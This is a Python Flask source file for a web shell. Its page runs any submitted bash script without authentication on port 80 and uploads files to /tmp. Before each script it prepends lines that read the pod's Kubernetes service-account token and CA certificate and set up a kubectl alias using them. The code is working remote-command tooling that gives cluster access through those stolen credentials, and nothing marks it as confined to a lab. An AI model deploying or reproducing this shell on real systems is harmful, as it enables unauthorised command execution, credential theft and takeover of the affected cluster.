from flask import Flask, request, render_template_string, flash, redirect, url_for
import subprocess
import os
import stat
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = "webshell-secret-key"
UPLOAD_FOLDER = "/tmp"

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Webshell</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .box { border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; }
        textarea { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 80%; height: 150px; }
        input[type="submit"], button { background: #00ff00; color: #000; border: none; padding: 5px 15px; cursor: pointer; }
        pre { background: #000; padding: 10px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; }
        .alert { color: #ffff00; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>Webshell</h1>
    
    {% with messages = get_flashed_messages() %}
      {% if messages %}
        {% for message in messages %}
          <div class="alert">> {{ message }}</div>
        {% endfor %}
      {% endif %}
    {% endwith %}

    <div class="box">
        <h2>Run Script</h2>
        <form method="POST">
            <textarea name="cmd" placeholder="#!/bin/bash\nls -la" autofocus></textarea><br><br>
            <input type="submit" value="Run">
        </form>
    </div>

    <div class="box">
        <h2>Upload File to /tmp</h2>
        <form method="POST" action="/upload" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
    </div>

    {% if cmd %}
        <h2>Output:</h2>
        <pre>{{ output }}</pre>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    output = ""
    cmd = ""
    if request.method == 'POST':
        cmd = request.form.get('cmd')
        if cmd:
            # Normalize line endings to prevent syntax errors
            cmd = cmd.replace('\r\n', '\n').replace('\r', '\n')
            
            script_path = "/tmp/script.sh"
            try:
                # Write command to a temporary script file
                with open(script_path, "w") as f:
                    # Ensure shebang if missing, though typically shell=True handles simple commands.
                    # For multi-line, writing to a file is safer.
                    if not cmd.startswith("#!"):
                        f.write("""#!/bin/bash -i
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
alias k="kubectl --server=https://kubernetes.default.svc --certificate-authority=$CA_CERT --token=$TOKEN"\n""")
                    f.write(cmd)
                
                # Make executable
                st = os.stat(script_path)
                os.chmod(script_path, st.st_mode | stat.S_IEXEC)

                # Execute the script
                output = subprocess.check_output(script_path, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)
            finally:
                if os.path.exists(script_path):
                    os.remove(script_path)
                    
    return render_template_string(HTML, cmd=cmd, output=output)

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        flash('No file part')
        return redirect(url_for('index'))
    file = request.files['file']
    if file.filename == '':
        flash('No selected file')
        return redirect(url_for('index'))
    if file:
        filename = secure_filename(file.filename)
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)
        flash(f'File uploaded successfully to {filepath}')
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)